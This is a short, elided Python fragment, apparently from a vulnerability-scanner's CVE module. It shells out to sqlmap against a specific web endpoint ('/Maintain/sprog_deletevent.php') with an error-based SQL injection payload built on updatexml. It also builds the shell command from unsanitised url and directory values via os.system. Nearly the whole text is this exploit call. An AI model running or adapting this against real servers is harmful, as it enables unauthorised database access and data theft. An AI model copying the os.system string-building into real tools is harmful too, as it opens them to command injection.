            ...
            if not self.batch:
                ...
                if choose == "y":
                    ...
                    try:
                        ...
                        os.system(
                            f"cd cve/VulsScan/sqlmap/ && python sqlmap.py -u \"{url}/Maintain/sprog_deletevent.php?openid=1&id=1 or updatexml(1,concat(0x7e,(*)),0)&cloudip=1\" --output-dir={dir}/result/ --batch")
